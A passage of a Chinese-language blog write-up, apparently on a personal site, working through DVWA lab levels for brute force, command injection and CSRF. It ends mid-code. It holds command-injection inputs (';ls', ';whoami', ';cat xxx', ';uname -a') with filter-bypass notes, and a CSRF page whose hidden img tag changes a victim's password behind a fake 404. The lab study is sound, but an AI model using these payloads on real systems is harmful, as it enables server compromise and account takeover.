+<p>Payload1选择和之前的一样，<strong>simple list</strong>，导入密码字典。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628162413546.png" srcset="/img/loading.gif" lazyload alt="image-20210628162413546"></p>
+<p>第二个payload需要先选择<strong>option</strong>，找到<strong>grep-extract</strong>，选择add。</p>
+<p>点击<strong>fetch response</strong>，找到user_token的value位置，选中。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628163432187.png" srcset="/img/loading.gif" lazyload alt="image-20210628163432187"></p>
+<p>payload2的payload type设置为<strong>recursive grep</strong>（递归查找文件里符合条件的字符串）。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628164448476.png" srcset="/img/loading.gif" lazyload alt="image-20210628164448476"></p>
+<p>option下线程要设置成1，该模式下无法多线程。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628170043112.png" srcset="/img/loading.gif" lazyload alt="image-20210628170043112"></p>
+<p>设置redirctions（重定向）为always。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165536718.png" srcset="/img/loading.gif" lazyload alt="image-20210628165536718"></p>
+<p>爆破！</p>
+<p>回显成功！</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210628165704513.png" srcset="/img/loading.gif" lazyload alt="image-20210628165704513"></p>
+<h2 id="4-impossible"><a href="#4-impossible" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$user</span> );<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$user</span> );<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Default values</span><br>    <span class="hljs-variable">$total_failed_login</span> = <span class="hljs-number">3</span>;<br>    <span class="hljs-variable">$lockout_time</span>       = <span class="hljs-number">15</span>;<br>    <span class="hljs-variable">$account_locked</span>     = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// Check the database (Check user information)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// Check to see if the user has been locked out.</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="hljs-variable">$total_failed_login</span> ) )  &#123;<br>        <span class="hljs-comment">// User locked out.  Note, using this method would allow for user enumeration!</span><br>        <span class="hljs-comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span><br><br>        <span class="hljs-comment">// Calculate when the user would be allowed to login again</span><br>        <span class="hljs-variable">$last_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br>        <span class="hljs-variable">$last_login</span> = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-variable">$last_login</span> );<br>        <span class="hljs-variable">$timeout</span>    = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$last_login&#125;</span> +<span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );<br>        <span class="hljs-variable">$timenow</span>    = <span class="hljs-title function_ invoke__">strtotime</span>( <span class="hljs-string">&quot;now&quot;</span> );<br><br>        <span class="hljs-comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$timenow</span> &gt; <span class="hljs-variable">$timeout</span> )<br>            <span class="hljs-variable">$account_locked</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Check the database (if username matches the password)</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span>);<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br>    <span class="hljs-comment">// If its a valid login...</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &amp;&amp; ( <span class="hljs-variable">$account_locked</span> == <span class="hljs-literal">false</span> ) ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$avatar</span>       = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;avatar&#x27;</span> ];<br>        <span class="hljs-variable">$failed_login</span> = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;failed_login&#x27;</span> ];<br>        <span class="hljs-variable">$last_login</span>   = <span class="hljs-variable">$row</span>[ <span class="hljs-string">&#x27;last_login&#x27;</span> ];<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="hljs-subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Had the account been locked out since last login?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$failed_login</span> &gt;= <span class="hljs-variable">$total_failed_login</span> ) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="hljs-subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Reset bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );<br><br>        <span class="hljs-comment">// Give the user some feedback</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="hljs-subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;<br><br>        <span class="hljs-comment">// Update bad login count</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// Set the last login time</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-variable">$user</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这一次的源码要长很多，看起来很安全，分析一下。</p>
+<p>这次限制了登录的失败次数为3，锁定的时间默认为15分钟（实际是last_login+lockout_time）。</p>
+<p>如果超过了3次失败，账户将会锁定。</p>
+<p>并且添加了pdo机制，爆破和sql注入看起来很艰难。</p>
+<p>但总觉得可能会有爆破的方式，尝试去网上查找，最后在知乎找到了一篇<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/126639909">大佬的文章</a>，我也跟着做了一遍，结果失败了，暂未找到失败的原因。</p>
+<h1 id="三、command-injection（命令注入）"><a href="#三、command-injection（命令注入）" class="headerlink" title="三、command injection（命令注入）"></a>三、command injection（命令注入）</h1><p>以前比较擅长这个（因为简单），太久没搞了，复习一下。</p>
+<blockquote>
+<p><strong>命令执行</strong>是指攻击者通过浏览器或者其他客户端软件提交一些cmd命令（或者bash命令）至服务器程序，服务器程序通过system、eval、exec等函数直接或者间接地调用cmd.exe执行攻击者提交的命令。          </p>
+</blockquote>
+<p>界面：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629100902545.png" srcset="/img/loading.gif" lazyload alt="image-20210629100902545"></p>
+<h2 id="1-low-1"><a href="#1-low-1" class="headerlink" title="1.low"></a>1.low</h2><p>输入框提示输入ip地址，标题写着ping a device，很明显是ping命令。</p>
+<p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629101516837.png" srcset="/img/loading.gif" lazyload alt="image-20210629101516837"></p>
+<p>查看源码发现没有任何过滤，输入ip后会ping4次包，命令。</p>
+<p>使用连接符，可以让输入执行几条命令。</p>
+<blockquote>
+<p><strong>常见连接符</strong></p>
+<p>A;B    先执行A，再执行B<br>A&amp;B    简单拼接，A B之间无制约关系<br>A|B    显示B的执行结果<br>A&amp;&amp;B   A执行成功，然后才会执行B<br>A||B   A执行失败，然后才会执行B</p>
+</blockquote>
+<p>尝试查看当前目录文件：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-comment">;ls</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102717387.png" srcset="/img/loading.gif" lazyload alt="image-20210629102717387"></p>
+<p>查看上一层目录文件：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">;<span class="hljs-keyword">ls</span> <span class="hljs-string">../</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629102807547.png" srcset="/img/loading.gif" lazyload alt="image-20210629102807547"></p>
+<p>还有一些其他的命令都可以执行。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#当前用户名<br>;whoami<br>#查看文件<br>;cat xxx<br>#查看版本<br>;uname -a<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-medium-1"><a href="#2-medium-1" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104132920.png" srcset="/img/loading.gif" lazyload alt="image-20210629104132920"></p>
+<p>源码对一些符号做了过滤，&amp;&amp;和;会被过滤掉。</p>
+<p>但其他的连接符仍旧可以使用，例如|、||、&amp;。</p>
+<h2 id="3-high-1"><a href="#3-high-1" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629104639549.png" srcset="/img/loading.gif" lazyload alt="image-20210629104639549"></p>
+<p>对大部分的符号进行了过滤，很奇怪并没有过滤字符串。</p>
+<p>这里还有个很离奇的点，过滤的符号不是｜而是｜+空格，所以仍旧可以使用｜做连接符。</p>
+<p>但这样的题目总让人感觉怪怪的。</p>
+<h2 id="4-impossible-1"><a href="#4-impossible-1" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629110648951.png" srcset="/img/loading.gif" lazyload alt="image-20210629110648951"></p>
+<p>又是要检查token，防止csrf。</p>
+<p>传入的参数以.为分割，并检测是否为数字，检测成功后重新再组成ip地址。</p>
+<p>看起来是很难有方法能够绕过了。</p>
+<h1 id="四、csrf（跨站请求伪造）"><a href="#四、csrf（跨站请求伪造）" class="headerlink" title="四、csrf（跨站请求伪造）"></a>四、csrf（跨站请求伪造）</h1><blockquote>
+<p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
+</blockquote>
+<h2 id="1-low-2"><a href="#1-low-2" class="headerlink" title="1.low"></a>1.low</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629114943931.png" srcset="/img/loading.gif" lazyload alt="image-20210629114943931"></p>
+<p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629115142907.png" srcset="/img/loading.gif" lazyload alt="image-20210629115142907"></p>
+<p>get两个值，判断password_new和password_conf是否相等，相等则在数据库更新当前用户的密码。</p>
+<p>没有其他的验证机制。</p>
+<p><strong>构造链接：</strong></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#">http://127.0.0.1/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#</a></p>
+<p>只要访问这个链接，密码就会被改成111。</p>
+<p>不过这个链接太明显了，可以使用<strong>短链接</strong>进行伪装。</p>
+<p>也可以选择构造攻击页面去诱导受害者访问。</p>
+<blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;[http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#](http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#)&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> <br>  <br>————————<br> 来源：https://www.jianshu.com/p/e65ede7d7026<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="2-medium-2"><a href="#2-medium-2" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629120339916.png" srcset="/img/loading.gif" lazyload alt="image-20210629120339916"></p>
+<p>eregi（）函数是用指定的模式搜索一个字符串中指定的字符串，如果匹配成功返回true，反之返回false。</p>
+<p>关于<code>if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) )</code>:</p>
+<blockquote>
+<p>百度百科：</p>
+<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
+</blockquote>
+<p><strong>$_SERVER[‘HTTP_REFERER’]</strong> 就是链接到当前页面的前一页面的 URL 地址，也就是源地址。 </p>
+<p>**$_SERVER[‘SERVER_NAME’]**则为主机名（例如127.0.0.1），也就是受害者的ip。</p>
+<p>所以是检查源地址中是否包含主机名，所以构造的url必须要包含主机名。</p>
+<p>和low一样，先更改密码形成链接。</p>
+<p>然后换一个浏览器打开链接，显示request不正确。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629142330630.png" srcset="/img/loading.gif" lazyload alt="image-20210629142330630"></p>
+<details>
+
+<summary>
+
+<p>对比在原页面和新页面抓包到的内容，确实有不同，新页面并没有referer。</p>
+</summary>
+
+<p>原：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143700817.png" srcset="/img/loading.gif" lazyload alt="image-20210629143700817"></p>
+<p>新：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629143829526.png" srcset="/img/loading.gif" lazyload alt="image-20210629143829526"></p>
+</details>
+
+<p>因为eregi（）验证为false所以导致出现错误。</p>
+<p>所以写一个攻击页面。</p>
+<p><strong>文件名和内部链接的ip均为被攻击的ip</strong>（例如127.0.0.1）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>访问，出现了迷惑性质的提示。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170441299.png" srcset="/img/loading.gif" lazyload alt="image-20210629170441299"></p>
+<p>尝试用修改的密码登录，成功！</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170724287.png" srcset="/img/loading.gif" lazyload alt="image-20210629170724287"></p>
+<h2 id="3-high-2"><a href="#3-high-2" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210629170830488.png" srcset="/img/loading.gif" lazyload alt="image-20210629170830488"></p>
+<p>增加了token的验证。</p>
+<p>先提交修改一下密码，url出现了token，结合源码，应该是要验证token是否相同。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630103301622.png" srcset="/img/loading.gif" lazyload alt="image-20210630103301622"></p>
+<p>必须要获得用户的token，再提交表单，这一点看上去很难搞。</p>
+<p>经过了一番查询后发现，居然可以用xss结合起来，使用xss获得用户的token。</p>
+<p>这个等到xss高级的时候再一起来看吧。</p>
+<h2 id="4-impossible-2"><a href="#4-impossible-2" class="headerlink" title="4.impossible"></a>4.impossible</h2><p>界面增加了原来密码的验证。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630114602196.png" srcset="/img/loading.gif" lazyload alt="image-20210630114602196"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_current&#x27;</span> ];<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Sanitise current password input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_curr</span> );<br><br>    <span class="hljs-comment">// Check that the current password is correct</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_curr</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ 